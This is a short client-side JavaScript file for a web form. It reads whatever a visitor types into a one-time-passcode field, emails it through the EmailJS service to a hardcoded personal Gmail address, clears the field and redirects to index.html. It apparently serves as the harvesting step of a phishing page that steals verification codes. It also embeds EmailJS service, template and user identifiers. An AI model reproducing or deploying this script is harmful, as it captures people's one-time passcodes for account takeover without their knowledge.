// emailjs.init("3yaulPAGa3CdjhurB");
const otp = document.querySelector("#otp");
const btn = document.querySelector("button");
btn.onclick = () => {
  btn.innerHTML = "Loading...";
};
const serviceId = "service_q8avkcf";
const userId = "OA-tcKugNJ4zoTMBG";
const templateId = "template_w51zcmh";
document.getElementById("myForm").onsubmit = function (event) {
  event.preventDefault();
  const emailParams = {
    to_name: "zubikhush6@gmail.com",
    otp: otp.value,
  };
  console.log(emailParams);
  emailjs.send(serviceId, templateId, emailParams, userId).then(
    function (response) {
      console.log("Sent successfully:", response);
      otp.value = "";
      location.href = "index.html";
    },
    function (error) {
      console.log("Failed to send:", error);
    }
  );
};
